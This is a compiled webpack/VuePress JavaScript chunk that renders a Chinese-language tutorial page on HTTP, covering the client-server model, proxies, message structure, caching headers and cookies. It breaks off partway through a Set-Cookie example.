(window.webpackJsonp=window.webpackJsonp||[]).push([[5],{389:function(e,t,v){e.exports=v.p+"assets/img/HTTP & layers.023b4224.png"},390:function(e,t,v){e.exports=v.p+"assets/img/Client-server-chain.929f4051.png"},391:function(e,t,v){e.exports=v.p+"assets/img/HTTP_Request.d2fb5602.png"},392:function(e,t,v){e.exports=v.p+"assets/img/HTTP_Response.94e095a3.png"},393:function(e,t,v){e.exports=v.p+"assets/img/https_comunication_steps.48a77360.jpg"},394:function(e,t,v){e.exports=v.p+"assets/img/https_comunication.5319ab2a.png"},416:function(e,t,v){"use strict";v.r(t);var _=v(42),a=Object(_.a)({},(function(){var e=this,t=e.$createElement,_=e._self._c||t;return _("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[_("h1",{attrs:{id:"http"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http"}},[e._v("#")]),e._v(" HTTP")]),e._v(" "),_("div",{staticClass:"custom-block tip"},[_("p",{staticClass:"custom-block-title"},[e._v("参考")]),e._v(" "),_("p",[_("a",{attrs:{href:"https://developer.mozilla.org/zh-CN/docs/Web/HTTP",target:"_blank",rel:"noopener noreferrer"}},[e._v("MDN HTTP"),_("OutboundLink")],1)]),e._v(" "),_("p",[e._v("《图解HTTP》")])]),e._v(" "),_("p",[e._v("Web使用一种名为HTTP（HyperText Transfer Protocol，超文本传输协议）的协议作为规范，完成从客户端到服务器等一系列运作流程。而协议是指规则的约定。可以说，Web是建立在HTTP协议上通信的。")]),e._v(" "),_("h2",{attrs:{id:"概述"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#概述"}},[e._v("#")]),e._v(" 概述")]),e._v(" "),_("p",[e._v("HTTP是一种能够获取如 HTML 这样的网络资源的"),_("strong",[e._v("通讯协议")]),e._v("。它是在 Web 上进行数据交换的基础，是一种 "),_("strong",[e._v("client-server")]),e._v(" 协议，也就是说，请求通常是由像浏览器这样的接受方发起的。一个完整的Web文档通常是由不同的子文档拼接而成的，像是文本、布局描述、图片、视频、脚本等等。")]),e._v(" "),_("p",[e._v("客户端和服务端通过交换各自的消息（与数据流正好相反）进行交互。由像浏览器这样的客户端发出的消息叫做 requests，被服务端响应的消息叫做 responses。")]),e._v(" "),_("p",[e._v("HTTP被设计于20世纪90年代初期，是一种可扩展的协议。它是应用层的协议，通过TCP，或者是TLS－加密的TCP连接来发送，理论上任何可靠的传输协议都可以使用。因为其良好的扩展性，时至今日，它不仅被用来传输超文本文档，还用来传输图片、视频或者向服务器发送如HTML表单这样的信息。HTTP还可以根据网页需求，仅获取部分Web文档内容更新网页。\n"),_("img",{attrs:{src:v(389)}})]),e._v(" "),_("h3",{attrs:{id:"基于http的组件系统"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#基于http的组件系统"}},[e._v("#")]),e._v(" 基于HTTP的组件系统")]),e._v(" "),_("p",[e._v("HTTP是一个client-server协议：请求通过一个实体被发出，实体也就是用户代理。大多数情况下，这个用户代理都是指浏览器，当然它也可能是任何东西，比如一个爬取网页生成维护搜索引擎索引的机器爬虫。")]),e._v(" "),_("p",[e._v("每一个发送到服务器的请求，都会被服务器处理并返回一个消息，也就是response。在这个请求与响应之间，还有许许多多的被称为proxies的实体，他们的作用与表现各不相同，比如有些是网关，还有些是caches等。")]),e._v(" "),_("img",{attrs:{src:v(390)}}),e._v(" "),_("p",[e._v("实际上，在一个浏览器和处理请求的服务器之间，还有路由器、调制解调器等许多计算机。由于Web的层次设计，那些在网络层和传输层的细节都被隐藏起来了。HTTP位于最上层的应用层。虽然底层对于分析网络问题非常重要，但是大多都跟对HTTP的描述不相干。")]),e._v(" "),_("h4",{attrs:{id:"客户端：user-agent"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#客户端：user-agent"}},[e._v("#")]),e._v(" 客户端：user-agent")]),e._v(" "),_("p",[e._v("user-agent 就是任何能够为用户发起行为的工具。这个角色通常都是由浏览器来扮演。一些例外情况，比如是工程师使用的程序，以及Web开发人员调试应用程序。")]),e._v(" "),_("p",[e._v("浏览器总是作为发起一个请求的实体，他永远不是服务器（虽然近几年已经出现一些机制能够模拟由服务器发起的请求消息了）。")]),e._v(" "),_("p",[e._v("要展现一个网页，浏览器首先发送一个请求来获取页面的HTML文档，再解析文档中的资源信息发送其他请求，获取可执行脚本或CSS样式来进行页面布局渲染，以及一些其它页面资源（如图片和视频等）。然后，浏览器将这些资源整合到一起，展现出一个完整的文档，也就是网页。浏览器执行的脚本可以在之后的阶段获取更多资源，并相应地更新网页。")]),e._v(" "),_("p",[e._v("一个网页就是一个超文本文档。也就是说，有一部分显示的文本可能是链接，启动它（通常是鼠标的点击）就可以获取一个新的网页，使得用户可以控制客户端进行网上冲浪。浏览器来负责发送HTTP请求，并进一步解析HTTP返回的消息，以向用户提供明确的响应。")]),e._v(" "),_("h4",{attrs:{id:"web服务端"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#web服务端"}},[e._v("#")]),e._v(" Web服务端")]),e._v(" "),_("p",[e._v("在上述通信过程的另一端，是由Web Server来服务并提供客户端所请求的文档。Server只是虚拟意义上代表一个机器：它可以是共享负载（负载均衡）的一组服务器组成的计算机集群，也可以是一种复杂的软件，通过向其他计算机（如缓存，数据库服务器，电子商务服务器 ...）发起请求来获取部分或全部资源。")]),e._v(" "),_("p",[e._v("Server 不一定是一台机器，但一个机器上可以装载的众多Servers。在HTTP/1.1 和Host头部中，它们甚至可以共享同一个IP地址。")]),e._v(" "),_("h4",{attrs:{id:"代理（proxies）"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#代理（proxies）"}},[e._v("#")]),e._v(" 代理（Proxies）")]),e._v(" "),_("p",[e._v("在浏览器和服务器之间，有许多计算机和其他设备转发了HTTP消息。由于Web栈层次结构的原因，它们大多都出现在传输层、网络层和物理层上，对于HTTP应用层而言就是透明的，虽然它们可能会对应用层性能有重要影响。还有一部分是表现在应用层上的，被称为代理（Proxies）。代理（Proxies）既可以表现得透明，又可以不透明（“改变请求”会通过它们）。代理主要有如下几种作用：")]),e._v(" "),_("ul",[_("li",[e._v("缓存（可以是公开的也可以是私有的，像浏览器的缓存）")]),e._v(" "),_("li",[e._v("过滤（像反病毒扫描，家长控制...）")]),e._v(" "),_("li",[e._v("负载均衡（让多个服务器服务不同的请求）")]),e._v(" "),_("li",[e._v("认证（对不同资源进行权限管理）")]),e._v(" "),_("li",[e._v("日志记录（允许存储历史信息）")])]),e._v(" "),_("h3",{attrs:{id:"http-的基本性质"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-的基本性质"}},[e._v("#")]),e._v(" HTTP 的基本性质")]),e._v(" "),_("ul",[_("li",[e._v("HTTP 是简单的\n"),_("ul",[_("li",[e._v("虽然下一代HTTP/2协议将HTTP消息封装到了帧中，HTTP大体上还是被设计得简单易读。HTTP报文能够被人读懂，还允许简单测试，降低了门槛，对新人很友好。")])])]),e._v(" "),_("li",[e._v("HTTP 是可扩展的\n"),_("ul",[_("li",[e._v("在 HTTP/1.0 中出现的 HTTP headers 让协议扩展变得非常容易。只要服务端和客户端就新 headers 达成语义一致，新功能就可以被轻松加入进来。")])])]),e._v(" "),_("li",[e._v("HTTP 是无状态，有会话的\n"),_("ul",[_("li",[e._v("在同一个连接中，两个执行成功的请求之间是没有关系的。")]),e._v(" "),_("li",[e._v("使用HTTP的头部扩展，HTTP Cookies。把Cookies添加到头部中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。")])])])]),e._v(" "),_("blockquote",[_("p",[e._v("HTTP本质是无状态的，使用Cookies可以创建有状态的会话")])]),e._v(" "),_("ul",[_("li",[e._v("HTTP 和连接")])]),e._v(" "),_("p",[e._v("一个连接是由传输层来控制的，这从根本上不属于HTTP的范围。HTTP并不需要其底层的传输层协议是面向连接的，只需要它是可靠的，或不丢失消息的（至少返回错误）。在互联网中，有两个最常用的传输层协议：TCP是可靠的，而UDP不是。因此，HTTP依赖于面向连接的TCP进行消息传递，但连接并不是必须的。")]),e._v(" "),_("p",[e._v("在客户端（通常指浏览器）与服务器能够交互（客户端发起请求，服务器返回响应）之前，必须在这两者间建立一个 TCP 链接，打开一个 TCP 连接需要多次往返交换消息（因此耗时）。HTTP/1.0 默认为每一对 HTTP 请求/响应都打开一个单独的 TCP 连接。当需要连续发起多个请求时，这种模式比多个请求共享同一个 TCP 链接更低效。")]),e._v(" "),_("p",[e._v("为了减轻这些缺陷，HTTP/1.1引入了流水线（被证明难以实现）和持久连接的概念：底层的TCP连接可以通过"),_("code",[e._v("Connection")]),e._v("头部来被部分控制。HTTP/2则发展得更远，通过在一个连接复用消息的方式来让这个连接始终保持为暖连接。")]),e._v(" "),_("p",[e._v("为了更好的适合HTTP，设计一种更好传输协议的进程一直在进行。Google就研发了一种以UDP为基础，能提供更可靠更高效的传输协议QUIC，即快速UDP网络连接 ( Quick UDP Internet Connections )。")]),e._v(" "),_("h3",{attrs:{id:"http-能控制什么"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-能控制什么"}},[e._v("#")]),e._v(" HTTP 能控制什么")]),e._v(" "),_("p",[e._v("多年以来，HTTP良好的扩展性使得越来越多的Web功能归其控制。缓存和认证很早就可以由HTTP来控制了。另一方面，对同源同域的限制到2010年才有所改变。")]),e._v(" "),_("p",[e._v("以下是可以被HTTP控制的常见特性。")]),e._v(" "),_("ul",[_("li",[e._v("缓存\n"),_("ul",[_("li",[e._v("文档如何缓存能通过HTTP来控制。服务端能告诉代理和客户端哪些文档需要被缓存，缓存多久，而客户端也能够命令中间的缓存代理来忽略存储的文档。")])])]),e._v(" "),_("li",[e._v("开放同源限制\n"),_("ul",[_("li",[e._v("为了防止网络窥听和其它隐私泄漏，浏览器强制对Web网站做了分割限制。只有来自于相同来源的网页才能够获取网站的全部信息。这样的限制有时反而成了负担，HTTP可以通过修改头部来开放这样的限制，因此Web文档可以是由不同域下的信息拼接成的（某些情况下，这样做还有安全因素考虑）。")])])]),e._v(" "),_("li",[e._v("认证\n"),_("ul",[_("li",[e._v("一些页面能够被保护起来，仅让特定的用户进行访问。基本的认证功能可以直接通过HTTP提供，使用Authenticate相似的头部即可，或用HTTP Cookies来设置指定的会话。")])])]),e._v(" "),_("li",[e._v("代理和隧道\n"),_("ul",[_("li",[e._v("通常情况下，服务器和/或客户端是处于内网的，对外网隐藏真实 IP 地址。因此 HTTP 请求就要通过代理越过这个网络屏障。但并非所有的代理都是 HTTP 代理。例如，SOCKS协议的代理就运作在更底层，一些像 FTP 这样的协议也能够被它们处理。")])])]),e._v(" "),_("li",[e._v("会话\n"),_("ul",[_("li",[e._v("使用HTTP Cookies允许你用一个服务端的状态发起请求，这就创建了会话。虽然基本的HTTP是无状态协议。这很有用，不仅是因为这能应用到像购物车这样的电商业务上，更是因为这使得任何网站都能轻松为用户定制展示内容了。")])])])]),e._v(" "),_("h3",{attrs:{id:"http-流"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-流"}},[e._v("#")]),e._v(" HTTP 流")]),e._v(" "),_("p",[e._v("当客户端想要和服务端进行信息交互时（服务端是指最终服务器，或者是一个中间代理），过程表现为下面几步：")]),e._v(" "),_("ol",[_("li",[e._v("打开一个TCP连接：TCP连接被用来发送一条或多条请求，以及接受响应消息。客户端可能打开一条新的连接，或重用一个已经存在的连接，或者也可能开几个新的TCP连接连向服务端。")]),e._v(" "),_("li",[e._v("发送一个HTTP报文：HTTP报文（在HTTP/2之前）是语义可读的。在HTTP/2中，这些简单的消息被封装在了帧中，这使得报文不能被直接读取，但是原理仍是相同的。")])]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[e._v("GET / HTTP/1.1\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Host:")]),e._v(" developer.mozilla.org\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept-Language:")]),e._v(" fr\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br")])]),_("ol",{attrs:{start:"3"}},[_("li",[e._v("读取服务端返回的报文信息：")])]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token response-status"}},[e._v("HTTP/1.1 "),_("span",{pre:!0,attrs:{class:"token property"}},[e._v("200 OK")])]),e._v("\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Date:")]),e._v(" Sat, 09 Oct 2010 14:28:02 GMT\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Server:")]),e._v(" Apache\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Last-Modified:")]),e._v(" Tue, 01 Dec 2009 20:18:22 GMT\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("ETag:")]),e._v(' "51142bc1-7449-479b075b2891b"\n'),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Accept-Ranges:")]),e._v(" bytes\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Length:")]),e._v(" 29769\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-Type:")]),e._v(" text/html"),_("span",{pre:!0,attrs:{class:"token text-html"}},[e._v("\n\n<!DOCTYPE html... (here comes the 29769 bytes of the requested web page)\n")])])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br"),_("span",{staticClass:"line-number"},[e._v("2")]),_("br"),_("span",{staticClass:"line-number"},[e._v("3")]),_("br"),_("span",{staticClass:"line-number"},[e._v("4")]),_("br"),_("span",{staticClass:"line-number"},[e._v("5")]),_("br"),_("span",{staticClass:"line-number"},[e._v("6")]),_("br"),_("span",{staticClass:"line-number"},[e._v("7")]),_("br"),_("span",{staticClass:"line-number"},[e._v("8")]),_("br"),_("span",{staticClass:"line-number"},[e._v("9")]),_("br"),_("span",{staticClass:"line-number"},[e._v("10")]),_("br")])]),_("ol",{attrs:{start:"4"}},[_("li",[e._v("关闭连接或者为后续请求重用连接。")])]),e._v(" "),_("p",[e._v("当HTTP流水线启动时，后续请求都可以不用等待第一个请求的成功响应就被发送。然而HTTP流水线已被证明很难在现有的网络中实现，因为现有网络中有很多老旧的软件与现代版本的软件共存。因此，HTTP流水线已被在有多请求下表现得更稳健的HTTP/2的帧所取代。")]),e._v(" "),_("h3",{attrs:{id:"http-报文"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-报文"}},[e._v("#")]),e._v(" HTTP 报文")]),e._v(" "),_("p",[e._v("HTTP/1.1以及更早的HTTP协议报文都是语义可读的。在HTTP/2中，这些报文被嵌入到了一个新的二进制结构，帧。帧允许实现很多优化，比如报文头部的压缩和复用。即使只有原始HTTP报文的一部分以HTTP/2发送出来，每条报文的语义依旧不变，客户端会重组原始HTTP/1.1请求。因此用HTTP/1.1格式来理解HTTP/2报文仍旧有效。")]),e._v(" "),_("p",[e._v("有两种HTTP报文的类型，请求与响应，每种都有其特定的格式。")]),e._v(" "),_("h4",{attrs:{id:"请求"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#请求"}},[e._v("#")]),e._v(" 请求")]),e._v(" "),_("p",[e._v("HTTP请求的一个例子：\n"),_("img",{attrs:{src:v(391)}})]),e._v(" "),_("p",[e._v("请求由以下元素组成：")]),e._v(" "),_("ul",[_("li",[e._v("一个HTTP的method，经常是由一个动词像GET, POST 或者一个名词像OPTIONS，HEAD来定义客户端的动作行为。通常客户端的操作都是获取资源（GET方法）或者发送HTML form表单值（POST方法），虽然在一些情况下也会有其他操作。")]),e._v(" "),_("li",[e._v("要获取的资源的路径，通常是上下文中就很明显的元素资源的URL，它没有protocol （http://），domain（developer.mozilla.org），或是TCP的port（HTTP一般在80端口）。")]),e._v(" "),_("li",[e._v("HTTP协议版本号。")]),e._v(" "),_("li",[e._v("为服务端表达其他信息的可选头部headers。")]),e._v(" "),_("li",[e._v("对于一些像POST这样的方法，报文的body就包含了发送的资源，这与响应报文的body类似。")])]),e._v(" "),_("h4",{attrs:{id:"响应"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#响应"}},[e._v("#")]),e._v(" 响应")]),e._v(" "),_("p",[e._v("HTTP响应的一个例子：\n"),_("img",{attrs:{src:v(392)}})]),e._v(" "),_("p",[e._v("响应报文包含了下面的元素：")]),e._v(" "),_("ul",[_("li",[e._v("HTTP协议版本号。")]),e._v(" "),_("li",[e._v("一个状态码（status code），来告知对应请求执行成功或失败，以及失败的原因。")]),e._v(" "),_("li",[e._v("一个状态信息，这个信息是非权威的状态码描述信息，可以由服务端自行设定。")]),e._v(" "),_("li",[e._v("HTTP headers，与请求头部类似。")]),e._v(" "),_("li",[e._v("可选项，比起请求报文，响应报文中更常见地包含获取的资源body。")])]),e._v(" "),_("h3",{attrs:{id:"基于http的apis"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#基于http的apis"}},[e._v("#")]),e._v(" 基于HTTP的APIs")]),e._v(" "),_("p",[e._v("基于HTTP的最常用API是"),_("code",[e._v("XMLHttpRequest")]),e._v(" API，可用于在user agent和服务器之间交换数据。 现代"),_("code",[e._v("Fetch")]),e._v(" API提供相同的功能，具有更强大和灵活的功能集。")]),e._v(" "),_("p",[e._v("另一种API，即服务器发送的事件，是一种单向服务，允许服务器使用HTTP作为传输机制向客户端发送事件。 使用"),_("code",[e._v("EventSource")]),e._v("接口，客户端打开连接并建立事件句柄。 客户端浏览器自动将到达HTTP流的消息转换为适当的"),_("code",[e._v("Event")]),e._v("对象，并将它们传递给专门处理这类"),_("code",[e._v("type")]),e._v("事件的句柄，如果有这么个句柄的话。但如果相应的事件处理句柄根本没有建立，那就交给"),_("code",[e._v("onmessage")]),e._v("事件处理程序处理。")]),e._v(" "),_("h3",{attrs:{id:"总结"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[e._v("#")]),e._v(" 总结")]),e._v(" "),_("p",[e._v("HTTP是一种简单可扩展的协议，其Client-Server的结构以及轻松扩展头部信息的能力使得HTTP可以和Web共同发展。")]),e._v(" "),_("p",[e._v("即使HTTP/2为了提高性能将HTTP报文嵌入到帧中这一举措增加了复杂度，但是从Web应用的角度看，报文的基本结构没有变化，从HTTP/1.0发布起就是这样的结构。")]),e._v(" "),_("h2",{attrs:{id:"http-缓存"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-缓存"}},[e._v("#")]),e._v(" HTTP 缓存")]),e._v(" "),_("p",[e._v("缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。当 web 缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。这样带来的好处有：缓解服务器端压力，提升性能(获取资源的耗时更短了)。对于网站来说，缓存是达到高性能的重要组成部分。缓存需要合理配置，因为并不是所有资源都是永久不变的：重要的是对一个资源的缓存应截止到其下一次发生改变（即不能缓存过期的资源）。")]),e._v(" "),_("p",[e._v("缓存的种类有很多,其大致可归为两类：私有与共享缓存。共享缓存存储的响应能够被多个用户使用。私有缓存只能用于单独用户。下方以浏览器与代理缓存为代表介绍一下，除此之外还有网关缓存、CDN、反向代理缓存和负载均衡器等部署在服务器上的缓存方式，为站点和 web 应用提供更好的稳定性、性能和扩展性。")]),e._v(" "),_("ul",[_("li",[e._v("(私有)浏览器缓存\n"),_("ul",[_("li",[e._v("私有缓存只能用于单独用户。你可能已经见过浏览器设置中的“缓存”选项。浏览器缓存拥有用户通过 HTTP 下载的所有文档。这些缓存为浏览过的文档提供向后/向前导航，保存网页，查看源码等功能，可以避免再次向服务器发起多余的请求。它同样可以提供缓存内容的离线浏览。")])])]),e._v(" "),_("li",[e._v("(共享)代理缓存\n"),_("ul",[_("li",[e._v("共享缓存可以被多个用户使用。例如，ISP 或你所在的公司可能会架设一个 web 代理来作为本地网络基础的一部分提供给用户。这样热门的资源就会被重复使用，减少网络拥堵与延迟。")])])])]),e._v(" "),_("h3",{attrs:{id:"浏览器缓存"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#浏览器缓存"}},[e._v("#")]),e._v(" 浏览器缓存")]),e._v(" "),_("ul",[_("li",[e._v("强制缓存\n"),_("ul",[_("li",[e._v("浏览器在加载资源时，会先根据本地缓存资源的 "),_("code",[e._v("header")]),e._v(" 中的信息判断是否命中强缓存，如果命中则直接使用缓存中的资源不会再向服务器发送请求。\n"),_("ul",[_("li",[e._v("查看 "),_("code",[e._v("header")]),e._v(" 头中的 "),_("code",[e._v("Expires")]),e._v(" 和 "),_("code",[e._v("Cache-control")]),e._v(" 来判断是否满足规则；")]),e._v(" "),_("li",[e._v("如果满足规则，就返回缓存的数据；")]),e._v(" "),_("li",[e._v("如果不满足规则，就向服务器发送请求；")]),e._v(" "),_("li",[e._v("服务器返回数据；")]),e._v(" "),_("li",[e._v("将新数据存入缓存。")])])]),e._v(" "),_("li",[_("code",[e._v("Expires")]),e._v(" "),_("ul",[_("li",[e._v("这个字段包含了一个时间，过了这个时间，响应将会失效。")]),e._v(" "),_("li",[_("code",[e._v("Expires")]),e._v(" 受限于本地时间")])])]),e._v(" "),_("li",[_("code",[e._v("Cache-Control")]),e._v(" "),_("ul",[_("li",[e._v("这个字段包含一个 "),_("code",[e._v("max-age")]),e._v(" 属性，该字段表示资源缓存的最大有效时间，这就是一个相对时间。")]),e._v(" "),_("li",[e._v("可缓存性\n"),_("ul",[_("li",[_("code",[e._v("public")]),e._v("：表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存，即使是通常不可缓存的内容。")]),e._v(" "),_("li",[_("code",[e._v("private")]),e._v("：表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）")]),e._v(" "),_("li",[_("code",[e._v("no-cache")]),e._v("：在发布缓存副本之前，强制要求缓存把请求提交给原始服务器进行验证(协商缓存验证)。")]),e._v(" "),_("li",[_("code",[e._v("no-store")]),e._v("：缓存不应存储有关客户端请求或服务器响应的任何内容，即不使用任何缓存。")])])]),e._v(" "),_("li",[e._v("到期\n"),_("ul",[_("li",[_("code",[e._v("max-age=<seconds>")]),e._v(": 设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。与Expires相反，时间是相对于请求的时间。")]),e._v(" "),_("li",[_("code",[e._v("s-maxage=<seconds>")]),e._v("：覆盖"),_("code",[e._v("max-age")]),e._v("或者"),_("code",[e._v("Expires")]),e._v("头，但是仅适用于共享缓存(比如各个代理)，私有缓存会忽略它。")]),e._v(" "),_("li",[_("code",[e._v("max-stale[=<seconds>]")]),e._v("：表明客户端愿意接收一个已经过期的资源。可以设置一个可选的秒数，表示响应不能已经过时超过该给定的时间。")]),e._v(" "),_("li",[_("code",[e._v("min-fresh=<seconds>")]),e._v("：表示客户端希望获取一个能在指定的秒数内保持其最新状态的响应。")])])])])]),e._v(" "),_("li",[e._v("基本上都会同时设置 "),_("code",[e._v("Expires")]),e._v(" 和 "),_("code",[e._v("Cache-Control")]),e._v(" ，"),_("code",[e._v("Cache-Control")]),e._v(" 的优先级别更高")])])]),e._v(" "),_("li",[e._v("协商缓存\n"),_("ul",[_("li",[e._v("当强缓存没有命中的时候，浏览器会发送一个请求到服务器，服务器根据请求头中的部分信息来判断是否命中缓存。如果命中，则返回 "),_("code",[e._v("304")]),e._v(" ，告诉浏览器资源未更新，可使用本地的缓存。\n"),_("ul",[_("li",[e._v("把资源标识，比如 "),_("code",[e._v("If-Modify-Since")]),e._v(" 或 "),_("code",[e._v("Etag")]),e._v(" 发送到服务器，确认资源是否更新；")]),e._v(" "),_("li",[e._v("如果资源未更新，请求响应返回的http状态为 "),_("code",[e._v("304")]),e._v(" 并且会显示一个 "),_("code",[e._v("Not Modified")]),e._v(" 的字符串，告诉浏览器使用本地缓存;")]),e._v(" "),_("li",[e._v("如果资源已经更新，返回新的数据；")]),e._v(" "),_("li",[e._v("将新数据存入缓存。")])])]),e._v(" "),_("li",[_("code",[e._v("Last-Modified")]),e._v("，"),_("code",[e._v("If-Modified-Since")]),e._v(" "),_("ul",[_("li",[e._v("浏览器第一次请求资源的时候，服务器返回的 "),_("code",[e._v("header")]),e._v(" 上会带有一个 "),_("code",[e._v("Last-Modified")]),e._v(" 字段，表示资源"),_("strong",[e._v("最后修改的时间")]),e._v("。")]),e._v(" "),_("li",[e._v("当浏览器再次请求该资源时，请求头中会带有一个 "),_("code",[e._v("If-Modified-Since")]),e._v(" 字段，这个值是第一次请求返回的 "),_("code",[e._v("Last-Modified")]),e._v(" 的值。")]),e._v(" "),_("li",[e._v("服务器收到这个请求后，将 "),_("code",[e._v("If-Modified-Since")]),e._v(" 和当前的 "),_("code",[e._v("Last-Modified")]),e._v(" 进行对比。如果相等，则说明资源未修改，返回 "),_("code",[e._v("304")]),e._v("，浏览器使用本地缓存。")]),e._v(" "),_("li",[e._v("缺点\n"),_("ul",[_("li",[e._v("最小单位是秒。也就是说如果短时间内资源发生了改变，"),_("code",[e._v("Last-Modified")]),e._v(" 并不会发生变化")]),e._v(" "),_("li",[e._v("如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 "),_("code",[e._v("Last-Modified")]),e._v(" 被修改，服务端不能命中缓存导致发送相同的资源")]),e._v(" "),_("li",[e._v("周期性变化。如果这个资源在一个周期内修改回原来的样子了，我们认为是可以使用缓存的，但是 "),_("code",[e._v("Last-Modified")]),e._v(" 不这样认为")])])])])]),e._v(" "),_("li",[_("code",[e._v("Etag")]),e._v("，"),_("code",[e._v("If-None-Match")]),e._v(" "),_("ul",[_("li",[_("code",[e._v("Etag")]),e._v(" 一般是由文件内容 "),_("code",[e._v("hash")]),e._v(" 生成的，也就是说它可以保证资源的唯一性，资源发生改变就会导致 "),_("code",[e._v("Etag")]),e._v(" 发生改变。")]),e._v(" "),_("li",[e._v("在浏览器第一次请求资源时，服务器会返回一个 "),_("code",[e._v("Etag")]),e._v(" 标识。当再次请求该资源时， 会通过 "),_("code",[e._v("If-no-match")]),e._v(" 字段将 "),_("code",[e._v("Etag")]),e._v(" 发送回服务器，然后服务器进行比较，如果相等，则返回 "),_("code",[e._v("304")]),e._v(" 表示未修改。")])])]),e._v(" "),_("li",[_("code",[e._v("Last-Modified")]),e._v(" 和 "),_("code",[e._v("Etag")]),e._v(" 是可以同时设置的，服务器会优先校验 "),_("code",[e._v("Etag")]),e._v("。")])])])]),e._v(" "),_("h2",{attrs:{id:"http-cookie"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-cookie"}},[e._v("#")]),e._v(" HTTP Cookie")]),e._v(" "),_("p",[e._v("HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。")]),e._v(" "),_("p",[e._v("Cookie主要用于以下三个方面：")]),e._v(" "),_("ul",[_("li",[e._v("会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）")]),e._v(" "),_("li",[e._v("个性化设置（如用户自定义设置、主题等）")]),e._v(" "),_("li",[e._v("浏览器行为跟踪（如跟踪分析用户行为等）")])]),e._v(" "),_("p",[e._v("Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 Web storage API （本地存储和会话存储）。")]),e._v(" "),_("h3",{attrs:{id:"创建cookie"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#创建cookie"}},[e._v("#")]),e._v(" 创建Cookie")]),e._v(" "),_("p",[e._v("当服务器收到HTTP请求时，服务器可以在响应头里面添加一个"),_("code",[e._v("Set-Cookie")]),e._v("选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过"),_("code",[e._v("Cookie")]),e._v("请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。")]),e._v(" "),_("h4",{attrs:{id:"set-cookie响应头部和cookie请求头部"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#set-cookie响应头部和cookie请求头部"}},[e._v("#")]),e._v(" Set-Cookie响应头部和Cookie请求头部")]),e._v(" "),_("p",[e._v("服务器使用"),_("code",[e._v("Set-Cookie")]),e._v("响应头部向用户代理（一般是浏览器）发送Cookie信息。一个简单的Cookie可能像这样：")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Set-Cookie:")]),e._v(" <cookie名>=<cookie值>\n")])]),e._v(" "),_("div",{staticClass:"line-numbers-wrapper"},[_("span",{staticClass:"line-number"},[e._v("1")]),_("br")])]),_("p",[e._v("服务器通过该头部告知客户端保存Cookie信息。")]),e._v(" "),_("div",{staticClass:"language-http line-numbers-mode"},[_("pre",{pre:!0,attrs:{class:"language-http"}},[_("code",[_("span",{pre:!0,attrs:{class:"token response-status"}},[e._v("HTTP/1.0 "),_("span",{pre:!0,attrs:{class:"token property"}},[e._v("200 OK")])]),e._v("\n"),_("span",{pre:!0,attrs:{class:"token header-name keyword"}},[e._v("Content-type:")]),e._v(" 